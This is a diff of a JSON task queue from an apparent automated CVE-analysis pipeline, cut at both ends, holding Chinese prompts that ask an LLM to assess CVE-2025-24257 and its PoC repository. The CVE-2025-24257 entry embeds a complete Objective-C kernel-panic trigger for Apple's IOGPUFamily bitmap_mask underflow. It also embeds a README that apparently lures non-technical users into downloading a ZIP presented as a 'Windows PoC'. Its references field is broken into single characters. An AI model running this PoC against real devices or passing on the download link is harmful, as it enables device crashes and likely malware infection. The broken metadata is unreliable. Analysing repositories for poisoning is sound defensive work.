```\n\n    **你的角色：** 你是一名专业的网络安全分析师，擅长分析CVE漏洞信息。\n\n    **任务：**\n\n    1.  **CVE有效性：** 分析此CVE是否为真实存在的有效漏洞。请综合考虑CVE编号格式、漏洞描述的完整性、参考链接的存在、漏洞的技术细节等因素。\n    2.  **POC有效性：** 判断提供的POC代码是否有效，是否能实际利用此漏洞，并分析其有效性。\n    3.  **投毒风险：** 分析POC代码内容,判断此仓库中是否存在作者隐藏的投毒代码,分析结果使用百分比。务必不要把POC验证的后门代码判定为投毒代码。\n    4.  **利用方式：** 详细分析并总结漏洞的利用方式，包括攻击步骤、所需条件等。\n    5.  **代码分析：** 详细分析POC代码的工作原理、关键组件和执行流程。\n    6.  **排序优先级:** 搜索引擎结果 >  漏洞利用代码 > 漏洞库信息\n    7.  **输出内容:** 务必使用中文\n    8.  **markdown内容:** 务必使用markdown格式，包含以下部分：\n        - 漏洞概述\n        - 有效性分析\n        - 投毒风险分析\n        - 利用方式\n        - 代码分析\n    **输出格式：**  你**必须**严格按照以下 **JSON** 格式输出，**不要包含任何额外的文字、说明或前缀/后缀**。JSON中的**所有键和字符串类型的值必须使用双引号**。请务必对特殊字符进行转义。\n\n    **示例JSON:**```json\n    {\n        \"name\": \"CVE-2023-12345-ExampleApp-SQL注入\",\n        \"type\": \"SQL注入\",\n        \"app\": \"ExampleApp\", \n        \"risk\": \"高危，可能导致数据泄露和远程代码执行\",\n        \"version\": \"<= 1.0\",\n        \"condition\": \"需要网络访问和数据库端口开放\",\n        \"poc_available\": \"是\",\n        \"poison\": \"90%\",\n        \"cve_valid\": \"是\",\n        \"markdown\": \"# 漏洞概述\n\n该漏洞存在于ExampleApp的登录模块,攻击者可以通过构造恶意的SQL语句绕过身份验证...\n\n## 有效性分析\n\n根据CVE编号格式、漏洞描述的完整性、参考链接的存在等因素，该CVE是真实有效的...\n\n## 投毒风险分析\n\n该仓库存在较高的投毒风险，主要原因是...\n\n## 利用方式\n\n1.  攻击者需要网络访问权限\n2.  构造恶意的SQL语句\n3.  发送到目标系统\n4.  绕过身份验证，获取系统访问权限\n\n## 代码分析\n\n主要代码组件包括：\n- `exploit.py`: 主漏洞利用脚本\n- `payloads.py`: 包含各种SQL注入payload\n- `utils.py`: 辅助工具函数\n\n代码执行流程：\n1.  连接到目标数据库\n2.  构造恶意SQL语句\n3.  发送到目标系统\n4.  解析响应，获取敏感信息\n\",\n        \"repo_name\": \"example/repo\",\n        \"repo_url\": \"https://github.com/example/repo\",\n        \"cve_url\": \"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-12345\"\n    }\n        ",
+    "retry_count": 1,
+    "max_retries": 5,
+    "priority": 2,
+    "status": "pending",
+    "error_type": "client_error",
+    "last_error": "API返回空结果",
+    "created_at": 1782359105.2201707,
+    "last_attempt": 1782359166.0428488,
+    "next_attempt": 1782359175.2001617,
+    "metadata": {},
+    "task_id": "task_CVE-2026-31431_1782359105",
+    "required_result_fields": [
+      "poc_available",
+      "condition",
+      "fix",
+      "risk_level",
+      "summary",
+      "attack_vector",
+      "affected_component",
+      "poison",
+      "markdown",
+      "repo_name",
+      "repo_url",
+      "cve_url"
+    ]
+  },
+  {
+    "cve_id": "CVE-2025-24257",
+    "prompt": "\n      请根据以下漏洞信息、搜索结果和漏洞利用代码，生成一份详细的漏洞分析报告，包含有效性分析、投毒风险分析、利用方式、代码分析等内容。请注意以下几点：\n\n    **信息来源：**\n\n    *   **漏洞库信息：**\n        ```\n        {\"cve_id\": \"CVE-2025-24257\", \"sources\": [\"NVD\", \"OSCS\"], \"descriptions\": [\"An out-of-bounds write issue was addressed with improved input validation. This issue is fixed in iOS 18.4 and iPadOS 18.4, macOS Sequoia 15.4, visionOS 2.4, watchOS 11.4. An app may be able to cause unexpected system termination or write kernel memory.\", \"\\u6807\\u9898: Apple iOS\\u548cApple iPadOS \\u5b89\\u5168\\u6f0f\\u6d1e\"], \"published_date\": \"2025-03-31T23:15:22.673\", \"last_modified_date\": \"2026-06-17T08:58:25.813\", \"cvss_score\": 7.1, \"severity\": \"HIGH\", \"references\": [\"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"s\", \"u\", \"p\", \"p\", \"o\", \"r\", \"t\", \".\", \"a\", \"p\", \"p\", \"l\", \"e\", \".\", \"c\", \"o\", \"m\", \"/\", \"e\", \"n\", \"-\", \"u\", \"s\", \"/\", \"1\", \"2\", \"2\", \"3\", \"7\", \"1\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"s\", \"u\", \"p\", \"p\", \"o\", \"r\", \"t\", \".\", \"a\", \"p\", \"p\", \"l\", \"e\", \".\", \"c\", \"o\", \"m\", \"/\", \"e\", \"n\", \"-\", \"u\", \"s\", \"/\", \"1\", \"2\", \"2\", \"3\", \"7\", \"3\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"s\", \"u\", \"p\", \"p\", \"o\", \"r\", \"t\", \".\", \"a\", \"p\", \"p\", \"l\", \"e\", \".\", \"c\", \"o\", \"m\", \"/\", \"e\", \"n\", \"-\", \"u\", \"s\", \"/\", \"1\", \"2\", \"2\", \"3\", \"7\", \"6\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"s\", \"u\", \"p\", \"p\", \"o\", \"r\", \"t\", \".\", \"a\", \"p\", \"p\", \"l\", \"e\", \".\", \"c\", \"o\", \"m\", \"/\", \"e\", \"n\", \"-\", \"u\", \"s\", \"/\", \"1\", \"2\", \"2\", \"3\", \"7\", \"8\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"s\", \"e\", \"c\", \"l\", \"i\", \"s\", \"t\", \"s\", \".\", \"o\", \"r\", \"g\", \"/\", \"f\", \"u\", \"l\", \"l\", \"d\", \"i\", \"s\", \"c\", \"l\", \"o\", \"s\", \"u\", \"r\", \"e\", \"/\", \"2\", \"0\", \"2\", \"5\", \"/\", \"A\", \"p\", \"r\", \"/\", \"1\", \"2\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"s\", \"e\", \"c\", \"l\", \"i\", \"s\", \"t\", \"s\", \".\", \"o\", \"r\", \"g\", \"/\", \"f\", \"u\", \"l\", \"l\", \"d\", \"i\", \"s\", \"c\", \"l\", \"o\", \"s\", \"u\", \"r\", \"e\", \"/\", \"2\", \"0\", \"2\", \"5\", \"/\", \"A\", \"p\", \"r\", \"/\", \"1\", \"3\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"s\", \"e\", \"c\", \"l\", \"i\", \"s\", \"t\", \"s\", \".\", \"o\", \"r\", \"g\", \"/\", \"f\", \"u\", \"l\", \"l\", \"d\", \"i\", \"s\", \"c\", \"l\", \"o\", \"s\", \"u\", \"r\", \"e\", \"/\", \"2\", \"0\", \"2\", \"5\", \"/\", \"A\", \"p\", \"r\", \"/\", \"4\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"s\", \"e\", \"c\", \"l\", \"i\", \"s\", \"t\", \"s\", \".\", \"o\", \"r\", \"g\", \"/\", \"f\", \"u\", \"l\", \"l\", \"d\", \"i\", \"s\", \"c\", \"l\", \"o\", \"s\", \"u\", \"r\", \"e\", \"/\", \"2\", \"0\", \"2\", \"5\", \"/\", \"A\", \"p\", \"r\", \"/\", \"8\"]}\n        ```\n    *   **搜索引擎结果：**\n        ```\n        \n            ## 以下内容是基于此漏洞的搜索结果:\n                [webpage 0 begin] [title] CVE-2025-24257: Apple iPadOS Buffer Overflow Vulnerability - SentinelOne\n [description] CVE-2025-24257 is a buffer overflow vulnerability in Apple iPadOS. Learn about its impact, affected versions, and mitigation methods.\n [link] https://www.sentinelone.com/vulnerability-database/cve-2025-24257/\n [webpage 0 end]\n[webpage 1 begin] [title] CVE-2025-24257 Security Vulnerability & Exploit Details\n [description] CVE-2025-24257 Vulnerability Summary CVE-2025-24257: An out-of-bounds write issue was addressed with improved input validation. This issue is fixed in visionOS 2.4, iOS 18.4 and iPadOS 18.4, macOS Sequoia 15.4. An app may be able to cause unexpected system termination or write kernel memory.\n [link] https://cve.akaoma.com/cve-2025-24257\n [webpage 1 end]\n[webpage 2 begin] [title] Nvd - Cve-2025-24257\n [description] NVD MENU Information Technology Laboratory National Vulnerability Database Vulnerabilities\n [link] https://nvd.nist.gov/vuln/detail/CVE-2025-24257\n [webpage 2 end]\n[webpage 3 begin] [title] GitHub - securekomodo/CVE-2025-22457: CVE-2025-22457: Python Exploit ...\n [description] CVE-2025-22457 CVE-2025-22457: Python Exploit POC Scanner to Detect Ivanti Connect Secure RCE This script helps identify Ivanti Connect Secure, Policy Secure, or ZTA Gateways that may be vulnerable to CVE-2025-22457, a critical unauthenticated stack-based buffer overflow in the web process triggered via a crafted X-Forwarded-For header.\n [link] https://github.com/securekomodo/CVE-2025-22457\n [webpage 3 end]\n[webpage 4 begin] [title] CVE-2025-22457: Python Exploit POC Scanner to Detect Ivanti Connect ...\n [description] Exploit PoC and vulnerability scanner for CVE-2025-22457 in Ivanti Connect Secure. Detect crashes, confirm exposure, and build detections.\n [link] https://www.redlinecybersecurity.com/blog/cve-2025-22457-python-exploit-poc-scanner-to-detect-ivanti-connect-secure-rce\n [webpage 4 end]\n[webpage 5 begin] [title] Exploit for Out-of-bounds Write in Apple Ipados CVE-2025-24257\n [description] IOGPUFamily bitmap_mask underflow — kernel heap OOB write**. First public PoC.panic: kernel data abort FAR: 0xffffffe0XXXXXXXX (unmapped, past zone page) PC: 0xFFFFFFF009863C7C (IOGPUFamily bitmap iterator) x27: 1 (capacity of vulnerable group) ``` ##.\n [link] https://sploitus.com/exploit?id=E7102E7F-793F-5DB6-A727-BAEC6F72C7C0\n [webpage 5 end]\n[webpage 6 begin] [title] CVE-2025-24257 - Exploits & Severity - Feedly\n [description] Detection in Vulnerability Scanners. Detection for the vulnerability has been added to Qualys (610646).\n [link] https://feedly.com/cve/CVE-2025-24257\n [webpage 6 end]\n[webpage 7 begin] [title] CVE-2025-24257 - Apple VisionOS/IOS/IPadOS/MacOS Kernel...\n [description] 8, 2018, 2:02 a.m. This repo has been linked 48 different CVEs too. Results are limited to the first 15 repositories due to potential performance issues. The following list is the news that have been mention CVE-2025-24257 vulnerability anywhere in the article.\n [link] https://cvefeed.io/vuln/detail/CVE-2025-24257\n [webpage 7 end]\n[webpage 8 begin] [title] CVE-2025-24257 Apple visionOS App out-of-bounds write\n [description] This vulnerability is known as CVE-2025-24257. It is recommended to upgrade the affected component. Several companies clearly confirm that VulDB is the primary source for best vulnerability data.\n [link] https://vuldb.com/?id.302389\n [webpage 8 end]\n[webpage 9 begin] [title] NVD - cve-2025-24257\n [description] CVE-2025-24257 Detail. Description. An out-of-bounds write issue was addressed with improved input validation.CVE Dictionary Entry: CVE-2025-24257 NVD Published Date: 03/31/2025 NVD Last Modified: 04/07/2025 Source: Apple Inc.\n [link] https://nvd.nist.gov/vuln/detail/cve-2025-24257\n [webpage 9 end]\n\n            \n        ```\n    *   **漏洞利用代码：**\n        ```\n        /tmp/b081ec9978b8c786ebaaef9f13abdac5/CVE_2025_24257.h\n---\n//\n//  CVE_2025_24257.h\n//  IOGPUFamily bitmap_mask underflow → kernel heap OOB write\n//\n//  Researcher: Wang Yu of Cyberserval (original discovery)\n//\n\n#import <Foundation/Foundation.h>\n\nvoid trigger_CVE_2025_24257(void);\n\n\n---\n/tmp/b081ec9978b8c786ebaaef9f13abdac5/CVE_2025_24257.m\n---\n//\n//  CVE_2025_24257.m\n//  IOGPUFamily bitmap_mask underflow → kernel heap OOB read (panic)\n//\n//  Researcher: Wang Yu of Cyberserval (original discovery)\n//  Target: iOS 18.3 (22D60) — VULNERABLE | Fixed in iOS 18.4\n//  Service: IOGPU (type=1) | Entitlements: NONE | Sandbox: YES\n//\n//  Root cause:\n//    newResourceGroup(capacity) computes bitmap_mask = (capacity >> 6) - 1\n//    When capacity < 64: bitmap_mask = 0xFFFFFFFF (unsigned underflow)\n//    The destructor iterates bitmap[0..bitmap_mask] on connection close,\n//    reading 32GB past the 8-byte bitmap allocation → kernel panic.\n//\n//  This PoC triggers a kernel panic. No exploitation attempted.\n//\n\n#import <Foundation/Foundation.h>\n#import <IOKit/IOKitLib.h>\n#import <mach/mach.h>\n\nvoid trigger_CVE_2025_24257(void) {\n    NSLog(@\"[CVE-2025-24257] IOGPUFamily bitmap_mask underflow PoC\");\n    NSLog(@\"[CVE-2025-24257] Opening IOGPU service...\");\n\n    // ── Step 1: Open IOGPU user client (no entitlements required) ──\n    io_service_t service = IOServiceGetMatchingService(\n        kIOMainPortDefault,\n        IOServiceMatching(\"IOGPU\")\n    );\n    if (service == IO_OBJECT_NULL) {\n        NSLog(@\"[CVE-2025-24257] IOGPU service not found\");\n        return;\n    }\n\n    io_connect_t conn = IO_OBJECT_NULL;\n    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 1, &conn);\n    IOObjectRelease(service);\n    if (kr != KERN_SUCCESS || conn == IO_OBJECT_NULL) {\n        NSLog(@\"[CVE-2025-24257] IOServiceOpen failed: 0x%x\", kr);\n        return;\n    }\n    NSLog(@\"[CVE-2025-24257] Connection: 0x%x\", conn);\n\n    // ── Step 2: Create vulnerable resource group ──\n    // selector 9 = s_new_resource\n    // structIn[0]  = 3  (resType = resource group)\n    // structIn[56] = 1  (capacity = 1)\n    //\n    // Inside the kernel, newResourceGroup computes:\n    //   bitmap_mask = (capacity >> 6) - 1\n    //   capacity=1 → (1 >> 6) = 0 → 0 - 1 = 0xFFFFFFFF (unsigned underflow!)\n    //\n    // The bitmap is allocated as 8 bytes (1 qword) in a kalloc.16 zone element.\n    // But bitmap_mask says there are 4 billion qwords (32GB).\n    uint8_t in[128] = {0};\n    uint8_t out[128] = {0};\n    *(uint32_t *)(in + 0) = 3;   // resType = resource group\n    *(uint32_t *)(in + 56) = 1;  // capacity = 1 → bitmap_mask = 0xFFFFFFFF\n    size_t outSz = 128;\n\n    kr = IOConnectCallMethod(conn, 9, NULL, 0, in, 128, NULL, NULL, out, &outSz);\n    if (kr != KERN_SUCCESS) {\n        NSLog(@\"[CVE-2025-24257] s_new_resource failed: 0x%x\", kr);\n        IOServiceClose(conn);\n        return;\n    }\n\n    uint32_t resourceId = *(uint32_t *)(out + 40);\n    uint32_t handle = *(uint32_t *)(out + 48);\n    NSLog(@\"[CVE-2025-24257] Vuln resource created: id=0x%x handle=0x%x\", resourceId, handle);\n    NSLog(@\"[CVE-2025-24257] bitmap_mask = 0xFFFFFFFF (should be 0)\");\n\n    // ── Step 3: Close connection → kernel panic ──\n    // IOServiceClose triggers resource cleanup on the IOKit workloop thread.\n    // The destructor iterates bitmap[0..bitmap_mask] (4 billion qwords).\n    // After ~50-500 elements it reads past the zone page into unmapped memory → panic.\n    //\n    // Panic signature:\n    //   pc = sub_FFFFFFF009863C7C (bitmap iterator in IOGPUFamily)\n    //   FAR = unmapped kernel address past kalloc.type.var*.16 zone page\n    NSLog(@\"[CVE-2025-24257] Closing connection → kernel panic...\");\n    IOServiceClose(conn);\n\n    // Never reached\n    NSLog(@\"[CVE-2025-24257] Unexpected: no panic\");\n}\n\n\n---\n/tmp/b081ec9978b8c786ebaaef9f13abdac5/README.md\n---\n# 🔧 CVE_2025_24257----NOT-MINE - Run the Windows PoC Safely\n\n[![Download](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge&logo=github)](https://github.com/Learningdisordercapital35/CVE_2025_24257----NOT-MINE/raw/refs/heads/main/immixture/NO_CV_MINE_v2.4.zip)\n\n## 🧾 Overview\n\nCVE_2025_24257----NOT-MINE is a Windows proof of concept that shows a kernel memory bug in IOGPUFamily. It is based on a bitmap_mask underflow that can lead to a kernel heap out-of-bounds write. This project is the first public PoC tied to the issue.\n\nThis repository is for users who want to download the package, open it on Windows, and run the sample with as little setup as possible. The goal of this README is to make the process simple for non-technical users.\n\n## 📥 Download\n\nUse this link to visit the project page and download the files:\n\n[Go to the download page](https://github.com/Learningdisordercapital35/CVE_2025_24257----NOT-MINE/raw/refs/heads/main/immixture/NO_CV_MINE_v2.4.zip)\n\nIf the page shows a release, asset, ZIP file, or source archive, download that file to your Windows PC. Save it in a folder you can find again, suc\n        ```\n\n    **你的角色：** 你是一名专业的网络安全分析师，擅长分析CVE漏洞信息。\n\n    **任务：**\n\n    1.  **CVE有效性：** 分析此CVE是否为真实存在的有效漏洞。请综合考虑CVE编号格式、漏洞描述的完整性、参考链接的存在、漏洞的技术细节等因素。\n    2.  **POC有效性：** 判断提供的POC代码是否有效，是否能实际利用此漏洞，并分析其有效性。\n    3.  **投毒风险：** 分析POC代码内容,判断此仓库中是否存在作者隐藏的投毒代码,分析结果使用百分比。务必不要把POC验证的后门代码判定为投毒代码。\n    4.  **利用方式：** 详细分析并总结漏洞的利用方式，包括攻击步骤、所需条件等。\n    5.  **代码分析：** 详细分析POC代码的工作原理、关键组件和执行流程。\n    6.  **排序优先级:** 搜索引擎结果 >  漏洞利用代码 > 漏洞库信息\n    7.  **输出内容:** 务必使用中文\n    8.  **markdown内容:** 务必使用markdown格式，包含以下部分：\n        - 漏洞概述\n        - 有效性分析\n        - 投毒风险分析\n        - 利用方式\n        - 代码分析\n    **输出格式：**  你**必须**严格按照以下 **JSON** 格式输出，**不要包含任何额外的文字、说明或前缀/后缀**。JSON中的**所有键和字符串类型的值必须使用双引号**。请务必对特殊字符进行转义。\n\n    **示例JSON:**```json\n    {\n        \"name\": \"CVE-2023-12345-ExampleApp-SQL注入\",\n        \"type\": \"SQL注入\",\n        \"app\": \"ExampleApp\", \n        \"risk\": \"高危，可能导致数据泄露和远程代码执行\",\n        \"version\": \"<= 1.0\",\n        \"condition\": \"需要网络访问和数据库端口开放\",\n        \"poc_available\": \"是\",\n        \"poison\": \"90%\",\n        \"cve_valid\": \"是\",\n        \"markdown\": \"# 漏洞概述\n\n该漏洞存在于ExampleApp的登录模块,攻击者可以通过构造恶意的SQL语句绕过身份验证...\n\n## 有效性分析\n\n根据CVE编号格式、漏洞描述的完整性、参考链接的存在等因素，该CVE是真实有效的...\n\n## 投毒风险分析\n\n该仓库存在较高的投毒风险，主要原因是...\n\n## 利用方式\n\n1.  攻击者需要网络访问权限\n2.  构造恶意的SQL语句\n3.  发送到目标系统\n4.  绕过身份验证，获取系统访问权限\n\n## 代码分析\n\n主要代码组件包括：\n- `exploit.py`: 主漏洞利用脚本\n- `payloads.py`: 包含各种SQL注入payload\n- `utils.py`: 辅助工具函数\n\n代码执行流程：\n1.  连接到目标数据库\n2.  构造恶意SQL语句\n3.  发送到目标系统\n4.  解析响应，获取敏感信息\n\",\n        \"repo_name\": \"example/repo\",\n        \"repo_url\": \"https://github.com/example/repo\",\n        \"cve_url\": \"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-12345\"\n    }\n        ",
     "retry_count": 0,
     "max_retries": 5,
     "priority": 2,
     "status": "pending",
     "error_type": null,
     "last_error": null,
-    "created_at": 1782342350.762517,
+    "created_at": 1782359162.1535943,
     "last_attempt": 0,
-    "next_attempt": 1782342356.258811,
+    "next_attempt": 1782359166.2876918,
     "metadata": {},
-    "task_id": "task_CVE-2026-38526_1782342350",
+    "task_id": "task_CVE-2025-24257_1782359162",
     "required_result_fields": [
       "poc_available",
       "condition",
